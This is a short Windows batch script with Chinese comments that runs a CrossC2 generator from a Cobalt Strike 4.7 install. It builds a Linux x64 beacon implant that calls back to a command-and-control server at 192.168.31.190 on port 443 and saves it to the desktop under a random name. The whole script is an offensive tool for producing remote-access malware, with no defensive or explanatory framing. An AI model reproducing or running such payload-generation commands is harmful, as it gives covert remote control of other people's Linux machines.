@echo off
setlocal

:: 切换到UTF-8编码避免乱码
chcp 65001 >nul

:: 设置桌面路径
set "DESKTOP=%USERPROFILE%\Desktop"

:: 生成随机文件名：linux_beacon_随机数.out
set "OUTPUT_NAME=linux_beacon_%RANDOM%.out"

:: 执行生成命令
D:\Cobalt_Strike_4.7\genCrossC2.exe 192.168.31.190 443 ./.cobaltstrike.beacon_keys null Linux x64 "%DESKTOP%\%OUTPUT_NAME%"

:: 显示结果
if %errorlevel% equ 0 (
    echo [+] Success: %DESKTOP%\%OUTPUT_NAME%
) else (
    echo [-] Failed
)

pause
endlocal